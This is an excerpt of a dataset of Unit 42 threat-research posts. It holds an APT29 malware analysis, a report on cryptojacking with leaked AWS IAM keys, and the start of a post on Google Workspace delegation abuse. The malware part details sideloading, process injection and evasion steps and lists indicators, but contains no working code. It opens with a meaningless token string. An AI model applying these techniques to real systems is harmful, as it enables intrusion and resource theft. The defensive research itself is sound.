M.R3_BL2.-CUanxFBYCxVzJ6hwSYPoLZ49NQ3X*y5rETt!aN*487MvafwQFn7kevSiXUwpGnHaquakM8vH6iESLDlXP38hmqQn98rRLvOzWwlKmD!8Xb5yEewCaa13S4Y1VyTIswo54Ez5ihRdUYCkYxkidMsZBn5!4icBZKpwC9hDW6G8OLcj8c2ZDtl8kUJ5PaX5TTDgXRzYdLPcqJFiNREjNg0*L569xMG1D14JpmjuO3HLBN2OclUv6c9FeuRwe5EuHA9aKhdqWkdjxWbnGGMgn9SnyDF7VSVCYT0*KBPNE!WYm*CXbE4jNTqJnkyPzvDJtj0OoA$$ - 3a1n71ujslwse9v - 75vedbskd505jyk - Hd0j7avNBxsAAAAAAAAAARq2fs5Ei8Z0-ahPPeB1McEek6NMzkGRmYHuxjsCZTfE Additional Resources - Espionage Campaign Linked to Russian Intelligence Services – Cybersecurity Emergency Response Team Poland (CERT.PL) Cloaked Ursa / APT29 Phishing Tweet (March 10, 2023) – Palo Alto Networks, Unit 42 - IOCs: Cloaked Ursa / APT29 Phishing Tweet (March 10, 2023) – Palo Alto Networks, Unit 42 - Russian APT29 Hackers Use Online Storage Services, DropBox and Google Drive – Palo Alto Networks, Unit 42 Appendix Technical Analysis of BMW Campaign The hyperlinks found within the malicious BMW 5 for sale in Kyiv - 2023.docx flyers (SHA256: 311e9c8cf6d0b295074ffefaa9f277cb1f806343be262c59f88fbdf6fe242517 and (SHA256: 8902bd7d085397745e05883f05c08de87623cc15fe630b36ad3d208f01ef0596) lead to a site (hxxps://resetlocations[.]com/bmw.htm) that was offline in mid-June, but they originally retrieved a large HTA file. (\nSHA256: 47e8f705febc94c832307dbf3e6d9c65164099230f4d438f7fe4851d701b580b) This HTA file contains roughly 10 MB of Base64-encoded and XORed data, followed by JavaScript code.\nThe JavaScript code would first make a request to the same domain on the URI kll.php, before decoding the embedded data mentioned above and triggering the browser to download it using msSaveOrOpenBlob, or a mix of createElement and createObjectURL should msSaveOrOpenBlob fail.\nThe downloaded file is assigned the name bmw.iso (SHA256: 79a1402bc77aa2702dc5dca660ca0d1bf08a2923e0a1018da70e7d7c31d9417f), matching the theme seen thus far.\nOnce downloaded, execution is reliant on the user clicking the downloaded file, which mounts the disk image to the system and opens up Windows File Explorer.\nThis reveals nine total files masquerading as images, which are instead LNK shortcut files (shown in the execution flow diagram in Figure 3).\nA hidden folder named $Recycle.\nBin is created alongside the LNK files.\nThis folder contains the real PNG images as well as three DLLs, an encrypted payload and a legitimate copy of Microsoft Word named windoc.exe.\nIf one of the LNK files is clicked, the following command line is executed.\nNote that the image name is changed depending on the LNK file clicked: While windoc.exe is not malicious, it does attempt to load several DLLs on runtime and falls victim to DLL hijacking.\nAs a result, it will load two of the three DLLs within its current directory, namely APPVISVSUBSYSTEMS64.dll (SHA256: 38f8b8036ed2a0b5abb8fbf264ee6fd2b82dcd917f60d9f1d8f18d07c26b1534) and MSVCP140.dll. (\nSHA256: 706112ab72c5d770d89736012d48a78e1f7c643977874396c30908fa36f2fed7).\nThe third DLL (Mso20Win32Client.dll) does not appear to be essential to the malware’s functioning and is added so that windoc.exe runs correctly, similarly to the DLL described below.\nMSVCP140 is not digitally signed, but does not contain any malicious functionality.\nIt appears to only contain a select few exports from a legitimate copy of MSVCP140.\nIt’s likely that this was included to execute windoc.exe on systems that did not have Microsoft Visual C++ Redistributables – at least enough so that it would load APPVISVSUBSYSTEMS64.\nAPPVISVSUBSYSTEMS64, on the other hand, is a fairly obfuscated DLL.\nIt leverages a large number of unnecessary assembly instructions, including the following, likely hindering decompilation efforts and slowing down analysis: - Psllq - Emms - Pcmpeqd - Punpckhbw APPVISVSUBSYSTEMS64 contains a number of anti-analysis techniques, including the following: - Making sure its process name is set to windoc.exe - Checking that the system has more than one processor - Leveraging NtQueryObject to search for any existing Debug Objects, to check for the existence of a debugger If these checks are all passed, the sample will proceed to open the encrypted payload file found within the ISO file, in this case named ojg2.px. (\nSHA256: c62199ef9c2736d15255f5deaa663158a7bb3615ba9262eb67e3f4adada14111).\nOnce read into memory, it will decrypt the file using an XOR operation, which results in a secondary shellcode layer.\nThe shellcode is then injected into the first two active Windows processes that it can inject into, such as taskhost.exe or sihost.exe, using a technique that is somewhat similar to one previously used by Cloaked Ursa (as recently described by the Military Counterintelligence Service and CERT.PL).\nFirst, the shellcode is mapped and copied into the remote process using NtMapViewOfSection before a new remote thread is created in a suspended state using NtCreateThreadEx.\nThe interesting aspect of this injection technique is that instead of the created thread pointing to the shellcode entry point or any Windows API, it is given a start address of a function within the APPVISVSUBSYSTEMS64 process.\nIt’s possible that the authors did this to evade monitoring tools from identifying a newly created thread pointing to malicious shellcode.\nBefore the thread is resumed with NtResumeThread, APPVISVSUBSYSTEMS64 will use NtGetContextThread and NtSetContextThread to modify the RCX register (which will contain the thread entry) to point to the entry point of the shellcode.\nThis results in the resumed thread calling RtlUserThreadStart, which will move the value in the RCX register to R9 before calling it, thus triggering the shellcode.\nThe goal of the shellcode is to extract the final executable file payload in memory and transfer execution to it.\nThis payload is the final sample in the infection chain and is responsible for handling communication to and from the command and control (C2) server.\nThe final payload contains a large array of obfuscation techniques, including string encryption and junk functions, as well as modifying exception handling structures to place “try and except” clauses part way through assembly instructions.\nThis effectively breaks the instructions when disassembling, as many disassemblers will take these structure values into consideration when parsing a binary file.\nThis results in a mangled control flow graph and failed decompilation due to the modifications in the exception handling structures.\nFor communication, the payload uses both the Microsoft Graph and Dropbox API.\nCloaked Ursa has previously leveraged Dropbox as a C2 server.\nHowever, Cloaked Ursa’s use of Microsoft Graph API to facilitate C2 communications appears to be a relatively new addition to their toolkit.\nIn addition to the string encrypted tokens and API keys required to communicate with these platforms, there is another string that stands out (shown in Figure 6), used when communicating with the Microsoft Graph API: Teams_test.\nGiven that the Graph API allows for interacting with a number of different Microsoft 365 Services including Microsoft Teams, it’s possible that this was an initial test for communicating via Teams or the Graph API.\nIf communication fails via the Graph API several times, communication via Dropbox is attempted.\nSeveral decrypted strings in the binary provide insight into the use of Dropbox for communication: Previously, Cloaked Ursa-linked payloads that communicate with Dropbox had wrapped communications in a packet that resembled an MP3 file.\nThe MP3 magic bytes (ID3\\x04\\x00\\x00\\x00\\x00\\x00#TSSE) were prepended to the encrypted data and uploaded to Dropbox as an MP3 file.\nIn this sample, it appears that they have opted to use BMP files.\nThe threat actor-owned C2 will upload commands to Dropbox that are wrapped in the BMP format.\nThese commands are retrieved by the payload and then parsed, decrypted and executed.\nAny data that the payload uploads to Dropbox will also be encrypted and wrapped in the BMP format.\nIn terms of handled commands, the payload accepts five possible requests from the C2 server, as described in the table below.\n| Command Value | Command Description | | 0 | Inject shellcode into explorer.exe or smartscreen.exe | | 1 | Execute specified command with CMD.exe | | 2 | Read from local file | | 3 | Write data to local file | | 4 | Spawn and inject code into WerFault.exe | Table 2.\nCommands handled by sample.\nBased on the lack of additional commands, it’s likely this is merely a loader for a further sample.\nAs of mid-June, the Dropbox and Graph API credentials are no longer valid, preventing access to any information that was uploaded to either platform.\nTechnical Analysis of Turkey Campaign We identified an additional sample with similar characteristics to other attributed Cloaked Ursa campaigns, which we believe to have been targeting the Turkish Ministry of Foreign Affairs.\nWe did not observe the lure or lures used in this campaign, but we are able to identify the attack chain after the original lure.\nWe assess that the original lure enticed the target to click on hxxps:// simplesalsamix[.]com/e-yazi.html.\nThe URL is no longer active, but it originally retrieved an HTTP smuggling file named e-yazi.html (SHA256: cd4956e4c1a3f7c8c008c4658bb9eba7169aa874c55c12fc748b0ccfe0f4a59a).\nThe downloaded file is assigned the name e-yazi.zip. (\nSHA256: 0dd55a234be8e3e07b0eb19f47abe594295889564ce6a9f6e8cc4d3997018839).\nThis sample contains five files.\nOnce again, a legitimate WinWord.exe binary was found within the archive, named e-yazi.docx.exe.\nHowever, whitespace was added between the .docx and .exe, resulting in the file appearing as a document file.\nAlongside the WinWord.exe, a file named APPVISVSUBSYSTEMS64.dll (SHA256: 60d96d8d3a09f822ded0a3c84194a5d88ed62a979cbb6378545b45b04353bb37 ) was present once again, as well as a file named okxi4t.z (SHA256: 03959c22265d0b85f6c94ee15ad878bb4f2956a2b0047733edbd8fdc86defc48).\nThis file is similar to the previously mentioned ojg2.px in that it contains encrypted shellcode.\nOn execution of WinWord.exe, APPVISVSUBSYSTEMS64.dll is sideloaded and (assuming the standard anti-analysis checks were passed) it would open and read the data from okxi4t.z before decrypting it and injecting it into the first running process it can.\nThe injected shellcode shares a number of similarities with code seen in the BMW-related sample, such as the following: - General execution flow - Functionality to unhook numerous Windows API calls - Its obfuscation techniques We were also able to confirm that the shellcode contained overlaps with the fourth-stage shellcode dropper loader, shown in Figure 7, as described in the Cloaked Ursa QUARTERRIG malware report by Military Counterintelligence Service and CERT.PL.\nThe same algorithm and payload structure can be seen within the injected shellcode, as shown in Figure 8, aside from minor differences such as the values of the magic_const and hashed_str.\nThe final payload within this infection chain is somewhat similar to the BMW-linked final payload, in that it leverages both Microsoft Graph API and the Dropbox API for C2 communication.\nInstead of Teams_test being the project name, it’s set to mytestworkapp1.\nThe hard-coded API tokens are also different from the initially analyzed sample.\nSimilar obfuscation was employed within this sample, including string encryption and control flow obfuscation via abusing the exception handling structures.\nHowever, there are no junk functions added to the sample, resulting in a much smaller file size of 498 KB.\nIt’s worth noting that the string encryption algorithms appear to line up with those seen within the Cloaked Ursa SNOWYAMBER and QUARTERRIG malware reports by the Military Counterintelligence Service and CERT.PL.\nMany of the string decryption functions leverage inline assembly keys (as seen in Figure 9), while the rest retrieve keys from the .rdata directory.\nIt’s clear that Cloaked Ursa remains dedicated to identifying legitimate platforms to host their C2 servers, based on their usage of the Microsoft Graph API within these two samples, as well as past reports describing C2 communication via Notion and Google Drive.\nUpdated July 20, 2023, at 12:43 p.m. PT to change UAC-0029 to UAC-0004.","num_sentences":151,"metadata":{"source":"blog","platform":"Unit42","filename":"Diplomats-Beware"}}
{"id":78,"title":"CloudKeys in the Air: Tracking Malicious Operations of Exposed IAM Keys","publish_date":"2020-12-28","link":"https://unit42.paloaltonetworks.com/malicious-operations-of-exposed-iam-keys-cryptojacking/","clean_text":"Executive Summary Unit 42 researchers have identified an active campaign we are calling EleKtra-Leak, which performs automated targeting of exposed identity and access management (IAM) credentials within public GitHub repositories.\nAWS detects and auto-remediates much of the threat of exposed credentials in popular source code repositories by applying a special quarantine policy — but by manually removing that automatic protection, we were able to develop deeper insights into the activities that the actor would carry out in the case where compromised credentials are obtained in some other way.\nIn those cases, the threat actor associated with the campaign was able to create multiple AWS Elastic Compute (EC2) instances that they used for wide-ranging and long-lasting cryptojacking operations.\nWe believe these operations have been active for at least two years and are still active today.\nWe found that the actor was able to detect and use the exposed IAM credentials within five minutes of their initial exposure on GitHub.\nAWS’s automatically applied quarantine policy limited the actor’s ability to operate, but by removing that policy we gained deep insight into the design and automation behind this campaign.\nThis finding and our broader research specifically highlights how threat actors can leverage cloud automation techniques to achieve their goals of expanding their cryptojacking operations.\nWe will discuss the threat actor’s operation and how we architected our Prisma Cloud HoneyCloud project to detect and monitor the operation.\nThe HoneyCloud project is a Prisma Cloud Security team research operation to expose a fully compromisable cloud environment that is designed to monitor and track any malicious operations that occur.\nPrisma Cloud uses this project to gather intelligence about potential attack path scenarios and threat actor operations in an attempt to provide defensive solutions for our cloud customers.\nDuring our monitoring of the cryptojacking pool used in the EleKtra-Leak operation, Aug. 30-Oct. 6, 2023, we found 474 unique miners that were potentially actor-controlled Amazon EC2 instances.\nBecause the actors mined Monero, a type of cryptocurrency that includes privacy controls, we cannot track the wallet to obtain exact figures of how much the threat actors gained.\nThe threat actor appears to have used automated tools to continually clone public GitHub repositories and scan for exposed Amazon Web Services (AWS) IAM credentials.\nThe threat actor also appeared to blocklist AWS accounts that routinely expose IAM credentials, in what we believe to be an effort to prevent security researchers from following their operations.\nThe threat actors might have perceived them to be obvious honey traps.\nTo counter this protective operation, we automated the creation of randomized AWS and user accounts with targeted overly-permissive IAM credentials.\nThis allowed us to track the actor’s movements.\nWe committed this information to a randomly generated GitHub repository that publicly exposed the researcher’s IAM credentials.\nAccording to the Unit 42 Cloud Threat Report Volume 7, 83% of organizations expose hard-coded credentials within the production code repositories.\nThe report offers recommendations that organizations can use to improve security around IAM credentials.\nWe also close this article with a few general recommendations that can help protect against the threat actor activity described here.\nFinally, it is critical that all users of cloud resources understand the cloud Shared Responsibility Model.\nIn short, users and organizations are responsible for any configurations, patching, maintenance and security monitoring for their cloud applications, IAM policies and used resources.\nBuild responsibly.\nPalo Alto Networks customers receive protection from this type of issue through the features described here in the following ways: - The Prisma Cloud Secrets Security module can detect and block secrets prior to and post-exposure in repositories, validating them for AWS IAM credentials to determine if they are privileged and therefore have a higher impact when exposed. -\nThe Prisma Cloud continuous integration and continuous delivery (CI/CD) module can detect misconfigurations, vulnerabilities and the exposure of secrets within public and private infrastructure as code (IaC) repositories such as GitHub.\nThis module can also track the malicious actions of compromised GitHub actions and workload runners. -\nBy monitoring GitHub audit events such as cloning GitHub repositories, the CI/CD module can detect the events discussed within this article and protect organizations from adversaries taking advantage of exposed IAM credentials. -\nPalo Alto Networks Cortex XDR for cloud leverages data from cloud hosts, cloud traffic and audit logs and combines them with endpoint and network data.\nThis dataset allows XDR to detect unusual cloud activity that correlates with known TTPs such as cloud compute credentials theft, cryptojacking and data exfiltration.\n| Related Unit 42 Topics | Cloud, Cryptojacking | The CloudKeys Operation As Unit 42 researchers working with Prisma Cloud’s security research team, we initiated a project dedicated to monitoring leaked IAM credentials within public GitHub repositories.\nWe did so in an attempt to find active threats leveraging these exposed and vulnerable IAM credentials.\nDuring the investigation, we found a threat actor monitoring for and using exposed AWS keys for cryptomining operations.\nWe are calling this campaign EleKtra-Leak, in reference to the Greek cloud nymph Electra and the usage of Lek as the first three characters in the passwords used by the threat actors.\nWhile this kind of cryptojacking activity is not new, this particular operation and its associated indicators lead us to believe that EleKtra-Leak has been active since at least December 2020.\nIn research dating back to 2021, Intezer issued a report that we believe to be related to EleKtra-Leak.\nHowever, it shows the threat actor using different initial access tactics and techniques for leveraging cloud services.\nSpecifically, the actor compromised exposed Docker services (as opposed to scanning and using exposed IAM credentials within GitHub) as we will discuss in this article.\nThe linking factor between these two campaigns is the threat actor using the same customized mining software.\nBackground From a research perspective, one of the challenges of purposefully leaking AWS keys is that once the threat actor identifies them, the keys can be easily attributed to the corresponding AWS account.\nWe found that the actor can likely recognize frequently recurring AWS account IDs, blocking those account IDs from future attacks or automation scripts.\nBecause of this, we designed a novel investigation architecture to dynamically create and leak AWS keys that are non-attributable.\nWe will discuss this more in the second section of this article.\nAttackers have increased their usage of GitHub as an initial vector of compromise over the years.\nOne powerful feature of GitHub is that it enables the capability to list all public repositories, which is very helpful for its users to easily track developments in topics of interest.\nThis allows developers – and unfortunately threat actors – to track new repositories in real time.\nGiven this capability, we selected GitHub as the platform for our experiment in leaking AWS keys.\nWe wrote the plaintext leaked keys to a file in a newly created GitHub repository that we randomly selected and cloned from a list of public GitHub repositories.\nWe leaked the AWS keys to a randomly created file inside of the cloned repository and then deleted them after they were successfully committed.\nWe immediately deleted the leaked keys once they were committed to the repository, to avoid the innate appearance of trying to lure threat actors.\nInitially, the IAM keys were encoded in Base64.\nHowever, no threat actor found the keys, even though tools like trufflehog can find exposed Base64 IAM keys.\nWe believe that the identified threat actor is not using tools capable of decoding Base64-encoded credentials at this time.\nOne of the reasons for this is probably because those tools are sometimes noisy and generate many false positives.\nWe followed up by experimenting with leaking AWS keys in cleartext, which the threat actor did find.\nThese were written in cleartext and hidden behind a past commit in a random file added to the cloned repo.\nGitHub Scanning Operations When we exposed the AWS keys in GitHub, GitHub's secret scanning feature discovered them, and then GitHub programmatically notified AWS about the exposed credentials.\nThis resulted in AWS automatically applying a quarantine policy to the user associated with the keys, called AWSCompromisedKeyQuarantine.\nThis policy prevents a threat actor from performing certain operations, as AWS automatically removes the ability to successfully leverage AWS IAM and EC2 among other API service operations associated with the exposed IAM credential.\nInitially, we left the AWS AWSCompromisedKeyQuarantine policy in place, passively monitoring the actor's reconnaissance operations as they tested the exposed keys.\nLater, as we will discuss in a following section, we intentionally replaced the AWS quarantine policy with the original overly-permissive IAM policy to gain further visibility into the full campaign operation.\nIt is important to note that the AWS quarantine policy was applied not because the threat actor launched the attack, but because AWS found the keys in GitHub.\nWe believe the threat actor might be able to find exposed AWS keys that aren’t automatically detected by AWS and subsequently control these keys outside of the AWSCompromisedKeyQuarantine policy.\nAccording to our evidence, they likely did.\nIn that case, the threat actor could proceed with the attack with no policy interfering with their malicious actions to steal resources from the victims.\nEven when GitHub and AWS are coordinated to implement a certain level of protection when AWS keys are leaked, not all cases are covered.\nWe highly recommend that CI/CD security practices, like scanning repos on commit, should be implemented independently.\nWe also found other potential victims of this campaign who attackers might have targeted in a different manner than what we discuss in this article.\nIn the case of our experiment with leaked keys, the actor started their operations within four minutes after AWS applied the quarantine policy.\nFigure 1 shows the timeline of these activities.\nThe last line in Figure 1 above shows that, starting with the CloudTrail event AttachUserPolicy, AWS applied the quarantine policy at timestamp 13:30:22.\nJust four minutes later, at 13:34:15, the actors began their reconnaissance operations using the AWS API DescribeRegions.\nCloudTrail is an auditing tool that records the actions and events that occur within configured cloud resources.\nActor Operation Architecture Figure 2 shows the overall threat actor automation architecture.\nGitHub public repositories are scanned in real time and once the keys are found, the attacker’s automation operation starts.\nFigure 3 shows that the threat actor starts by performing an AWS account reconnaissance operation.\nAfter the reconnaissance operation, the threat actor creates AWS security groups (as shown in Figure 4) before finally launching multiple EC2 instances per region across any accessible AWS region.\nThe data we collected shows indications that the actor’s automation operation is behind a VPN.\nThey repeated the same operations across multiple regions, generating a total of more than 400 API calls and taking only seven minutes, according to CloudTrail logging.\nThis indicates that the actor is successfully able to obscure their identity while launching automated attacks against AWS account environments.\nLaunch Instances and Configurations Part of the automation, once the AWS keys were found, included threat actors running instances across different regions.\nFigure 5 shows statistics about the instance types and their distribution across multiple regions.\nThe threat actors used large-format cloud virtual machines to perform their operations, specifically c5a.24xlarge AWS instances.\nIt is common practice for cryptomining operations to use large-format cloud instances, as they will facilitate higher processing power, allowing cryptojackers to mine more cryptocurrency in a shorter period of time.\nTo instantiate Amazon EC2 instances, the threat actor used the RunInstance API.\nThis API has a parameter for accepting AWS Cloud-Init scripts.\nThe Cloud-Init scripts are executed during the instance startup process.\nThe threat actor used this mechanism to automate the EC2 instance configuration and perform the desired actions.\nThe user data is not logged in CloudTrail logs.\nTo capture the data, we performed a forensic analysis of the EC2 volumes.\nAs shown in Figure 6, the mining automation operation displayed the user data automatically during the miner's configuration of the EC2 upon start-up.\nFigure 7 shows the payload was stored in Google Drive.\nNote that Google Drive URLs are anonymous by design.\nIt is not possible to map this URL to a Google Cloud user account.\nThe downloaded payload was stored encrypted and then decrypted upon download, as shown on line 6.\nThe payload was a known mining tool, and the hash can be correlated to previous research where we believe the same actor used publicly exposed Docker services to perform cryptojacking operations.\nWe also identified reports of submissions to VirusTotal with the same hash and using the same naming convention for persistence (“appworker”), as shown in Figure 7.\nThe type of Amazon Machine Images (AMI) the threat actor used was also distinctive.\nThe identified images were private and they were not listed in the AWS Marketplace.\nFigure 8 shows the following AMI instances’ IDs were used.\nSome of those images are Ubuntu 18 versions.\nWe believe that all of these indicators of compromise (IoCs) point to this being a long-running mining operation that dates back to at least 2020.\nMining Operation Tracking As mentioned above, the EC2 instances received their mining configurations through the EC2 user data.\nThe configuration contained the Monero wallet address each miner used to deliver its mined Monero.\nGiven the architecture of the operation, it is possible for us to speculate that the wallet address was used uniquely for AWS mining operations.\nIf that is the case, every worker connected to the pool represents an individual Amazon EC2 instance.\nThe mining pool that the threat actor used for this operation was the SupportXMR mining pool.\nMining pools are used in cryptomining operations as workspaces for multiple miners to work together to increase the chances of earning cryptocurrency rewards.\nWhen the rewards are granted, the proceeds are evenly distributed among the miners who contributed to the pool.\nGiven that the SupportXMR service only provides time-limited statistics, we monitored the wallet and pulled mining statistics for multiple weeks.\nFigure 9 shows the number of unique miners (likely representing resources stolen from targets of this campaign).\nIn total, 474 unique miners appeared between Aug. 30, 2023, and Oct. 6, 2023.\nWe can interpret this as 474 unique Amazon EC2 instances that were recorded performing mining operations during this time period.\nBecause the actors mined Monero, a type of cryptocurrency that includes privacy controls, we cannot track the wallet to obtain exact figures of how much the threat actors gained.\nGiven that the actor was using a virtual private network (VPN) and Google Drive-exported documents to deliver payloads, it is difficult to perform geolocation analysis.\nWe are continuing to monitor this mining campaign.\nThis aligns with a trend that Unit 42 has observed of attackers using trusted business applications to evade detection.\nThe Research Architecture To conduct our research, the Prisma Cloud Security Research team created a tool called HoneyCloud, a fully compromisable and reproducible cloud environment that provides researchers with the following capabilities: - Tracking malicious operations - Following cloud threat actor movements - Discovering new cloud attack paths - Building better cloud defense solutions.\nWe created a semi-random AWS infrastructure using IaC templates for Terraform, which is an IaC provisioning tool to manage and maintain cloud infrastructure.\nThis tool allowed us to create and destroy the infrastructure using timed scheduling in combination with human analysis.\nResearchers implemented a Terraform design as a direct result of our previous AWS account ID being added to the attacker’s blocklist.\nThe design introduced certain amounts of randomness in the generated AWS accounts and its freshly created infrastructure aided us in avoiding the threat actors’ operations to match or identify previous IAM credential leaks.\nWe also designed the Terraform automation to use different types of IAM policies (i.e., more or less restrictive IAM permissions) according to the activity the threat actor was executing in the AWS account.\nOne of the largest obstacles we experienced during this investigation was how fast AWS reacted in applying the quarantine policy to prevent malicious operations.\nAWS applied the quarantine policy within two minutes of the AWS credentials being leaked on GitHub.\nThe AWS quarantine policy would have successfully prevented this attack.\nHowever, after analyzing the mining operation, we found additional mining instances that appear to be potential victims of this campaign – perhaps because the keys were exposed in a different way or on a different platform.\nIn the case of our research, we were forced to overwrite the quarantine policy to ensure we could track the threat actor’s operation.\nTo perform this operation, we created a separate monitoring tool to restore the original overly-permissive AWS security policy we intended to be compromised.\nAutomated AWS Cloud Generation Figure 10 shows the overall IaC architecture for exposing AWS IAM credentials and subsequently monitoring the actions taken against them.\nThe IaC template for the designed architecture was responsible for randomly selecting GitHub repositories, cloning and leaking the AWS IAM keys as past commits in random files.\nOn the AWS side, new AWS accounts were dynamically created for each iteration of the IaC template execution, using the same AWS management organization and centralized CloudTrail log storage.\nWe also developed and deployed an additional lambda function in the AWS management account that functioned as a monitor to collect infrastructure changes and track IAM user policy changes.\nOne of the main objectives of the IaC template was to keep the AWS infrastructure components as random as possible to avoid being blocked by the threat actor.\nAnother objective was to allow the infrastructure to be destroyed on a regular and precise basis to start new environments and variables quickly and systematically.\nIn this way, the threat actor could only perceive the AWS IAM keys as part of an entirely new AWS environment and not a research environment.\nConclusion We discovered a threat actor’s operation that scanned for exposed AWS IAM credentials within public GitHub repositories.\nWe found that the threat actor can detect and launch a full-scale mining operation within five minutes from the time of an AWS IAM credential being exposed in a public GitHub repository.\nThe operation we found has been in action since at least 2020.\nDespite successful AWS quarantine policies, the campaign maintains continuous fluctuation in the number and frequency of compromised victim accounts.\nSeveral speculations as to why the campaign is still active include that this campaign is not solely focused on exposed GitHub credentials or Amazon EC2 instance targeting.\nWe developed a semi-automatic IaC Terraform architecture to track the operations of this threat actor group.\nThis included the dynamic creation of AWS accounts designed to be compromised and destroyed.\nPalo Alto Networks has shared these findings, including file samples and indicators of compromise, with our fellow Cyber Threat Alliance (CTA) members.\nCTA members use this intelligence to rapidly deploy protections to their customers and to systematically disrupt malicious cyber actors.\nLearn more about the Cyber Threat Alliance.\nRecommendations AWS Quarantine Policies When we initially exposed AWS IAM credentials within our decoy GitHub repositories, AWS successfully quarantined the exposed IAM credential using the AWS policy AWSCompromisedKeyQuarantineV2.\nThis policy denies access to several AWS services, including the following: - EC2 - S3 - IAM - Lambda - Lightsail This quarantining operation was initiated by AWS within minutes of the exposed IAM credential being committed to the GitHub repository.\nIt is critical that this quarantine policy remains in place to ensure that potential attackers do not leverage sensitive cloud data, services and resources.\nOrganizations that do inadvertently expose AWS IAM credentials should immediately revoke any API connections made using this credential.\nThe organization should also remove the AWS IAM credential from their GitHub repository and new AWS IAM credentials should be generated to fulfill the desired functionality.\nWe highly recommended that organizations use short-lived credentials to perform any dynamic functionality within a production environment.\nGitHub Enterprise Repository Clone Monitoring For threat actors to detect and capture AWS IAM credentials within GitHub repositories, they first need to clone the targeted repository to view its contents.\nGitHub Enterprise accounts maintain the feature of auditing clone events that occur on associated GitHub repositories.\nUsing this feature would allow a security team to monitor for potentially malicious operations targeted against their GitHub repositories.\nFor Personal (or free) accounts, the ability to audit actions performed within the repository is limited and auditing clone events is not possible.\nYou can learn more about the various types of GitHub accounts and their capabilities.\nGitHub Enterprise accounts are highly recommended for any organization publishing tools, applications or content, as they provide several auditing capabilities that can greatly assist in maintaining the security of your organization’s code repositories.\nPrisma Cloud The Prisma Cloud CI/CD module can alert GitHub repository owners about potentially malicious events, such as the following: - Exposed IAM credentials - Cloned repository events - The presence of misconfigured or vulnerable code - Compromised workload runners This will allow organizations to maintain visibility and security over their public code repositories.\nPrisma Cloud Code Security can also scan, detect and automatically mitigate vulnerabilities and misconfigurations, including the exposure of hard-coded credentials in developer IDEs, as pre-commit and pre-receive hooks in repositories, preventing credential exposure at the source.\nPrisma Cloud Anomaly Detection can detect anomalous compute provisioning activity through unusual entity behavior analytics (UEBA), traffic from suspicious crypto miner activity and cryptomining DNS request activity.\nAdditionally, Prisma Cloud can trigger suspicious Tor network traffic, a tactic often employed by threat actors.\nPrisma Cloud CIEM can help mitigate risky and over-privileged access by providing: - Visibility, alerting, and automated remediation on risky permissions - Automatic findings of unused permissions with Least-privilege access remediations Prisma Cloud Threat Detection capabilities can alert on various identity-related anomalous activities such as unusual usage of credentials from inside or outside of the cloud.\nPrisma Cloud can also perform runtime operation monitoring and provide governance, risk and compliance (GRC) requirements for any component associated with their cloud environment.\nCortex XDR Cortex XDR for Cloud provides SOC teams with a full incident story across the entire digital domain by integrating activity from cloud hosts, cloud traffic and audit logs together with endpoint and network data.\nCortex leverages all this data to detect unusual cloud activity that correlates with known TTPs such as cloud computing credential theft, cryptojacking and data exfiltration.\nIndicators of Compromise Encrypted Document: - Backup.tib SHA256: 87366652c83c366b70c4485e60594e7f40fd26bcc221a2db7a06debbebd25845 Miner Hash - Appworker SHA256: 240fe01d9fcce5aae311e906b8311a1975f8c1431b83618f3d11aeaff10aede3 Script Hashes - EC2 User Data SHA256: 2f0bd048bb1f4e83b3b214b24cc2b5f2fd04ae51a15aa3e301c8b9e5e187f2bb Domains - XMR Pool Address: pool[.]supportxmr[.]com:443 Monero Wallet Address - 82sdgJwuAMTF6w76Q7KrN4jJL72v23gvf9K2favHYHKxCNP4UabmBsJMwAVGWDLYagW5UmykC2D1zaMoQegZLy2bF9ynM1E Updated Oct. 30, 2023, at 12:20 p.m. PT to add additional Prisma Cloud protections.\nUpdated Nov. 6, 2023, at 12:07 p.m. PT to add clarifying language to the executive summary.","num_sentences":168,"metadata":{"source":"blog","platform":"Unit42","filename":"Exposed-IAM-Keys"}}
{"id":79,"title":"Exploring a Critical Risk in Google Workspace's Domain-Wide Delegation Feature","publish_date":"2023-06-28","link":"https://unit42.paloaltonetworks.com/critical-risk-in-google-workspace-delegation-feature/","clean_text":"Executive Summary Unit 42 researchers discovered a security risk in the Google Workspace (formerly known as G Suite) domain-wide delegation feature.\nWe exposed an unexpected way to gain access to the Google Workspace domain data from Google Cloud Platform (GCP).\nWe found that a GCP identity with the necessary permission can generate an access token to a delegated user.\nA malicious insider or an external attacker with stolen credentials can use this access token to impersonate Google Workspace users, granting unauthorized access to their data or to perform operations on their behalf.\nIn this article, we will highlight the risk of the Google Workspace domain-wide delegation feature.\nIn doing so, we will explore its potential misuse by malicious actors and examine the implications for the security of Google Workspace data.\nAs organizations increasingly rely on the power of cloud-based services like Google Workspace and Google Cloud Platform GCP, it becomes crucial to delve into the intricacies of their security features and vulnerabilities.\nWe will discuss the link between GCP and Google Workspace and examine how the GCP permission model can impact the security of Google Workspace.\nPalo Alto Networks customers receive protection from the issue discussed in this article through Cortex XDR and Prisma Cloud.\n| Related Unit 42 Topics | API, Cloud | Domain-Wide Delegation Misuse Overview Simulation A possible attack path shown in Figure 1 could be a malicious insider (e.g., a developer with editor permissions in a GCP project) exploiting their access.\nThey could do so by abusing a service account that is granted domain-wide delegation permissions in Google Workspace.\nThe insider has permission to generate access tokens to service accounts within the same GCP project.\nWith the domain-wide delegation permissions enabled, a malicious insider can impersonate users in the Google Workspace domain and use the access tokens to authenticate API requests.\nBy leveraging the appropriate scopes and API access, the insider can access and retrieve sensitive Google Workspace data, potentially compromising emails, documents and other confidential information stored within the domain.\nSuch actions highlight the threats of the domain-wide delegation feature.\nA worst case scenario would come about if an attacker has obtained a GCP service account token attached to a compute engine instance (e.g., the compute engine default service account, which has editor permissions by default).\nFrom there, the attacker may be able to exploit the domain-wide delegation feature for larger impact.\nIf in the same project, a service account with domain-wide delegation exists, this can lead the attacker to impersonate the delegated service account and move laterally from GCP to gain access to the Google Workspace environment.\nGoogle Workspace Before we delve into the intricacies of a recent security risk that surfaced within Google Workspace and GCP, it is crucial to establish a solid foundation of understanding about these powerful cloud-based services.\nGoogle Workspace apps are a collection of cloud-based collaboration tools.\nOrganizations use Google Workspace to enhance their productivity and communication through various tools such as the following: - Calendar - File storage and sharing - Team communication - Workflow automation - Security - Administration Google Workspace provides role-based access control (RBAC) capabilities and allows administrators to assign specific roles to users, granting them predefined sets of permissions based on their responsibilities and needs.\nThese roles include the following: - Super admin - Groups admin - User management admin Each role has specific privileges and controls over different aspects of the organization's Google Workspace environment.\nThe Google Workspace super admin holds elevated permissions and broader domain management responsibilities, including the ability to grant domain-wide delegation permission to service accounts, which we will explore in more detail later.\nGoogle Workspace administrators can also define application-specific permissions and restrict sharing and 